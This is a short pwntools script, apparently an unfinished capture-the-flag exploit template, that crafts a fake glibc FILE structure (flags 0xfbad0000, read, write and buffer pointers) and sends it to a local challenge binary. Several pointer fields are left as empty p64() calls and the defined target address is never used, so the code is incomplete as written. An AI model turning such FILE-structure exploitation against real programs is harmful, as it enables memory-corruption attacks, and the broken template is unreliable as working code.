from pwn import *

context.log_level='debug'
elf=context.binary=ELF("./chal")
p=process(elf.path)
targ=0x0000000000404028

fake = [
    p64(0xfbad0000), # add your flags here :)
    p64() * 3,     # _IO_read_x ptrs
    p64(),      # _IO_write_base
    p64(), # _IO_write_ptr
    p64(),         # _IO_write_end
    p64() * 2      # _IO_buf_x  
]

p.send(b''.join(fake))
print(p.recvall(timeout=1))
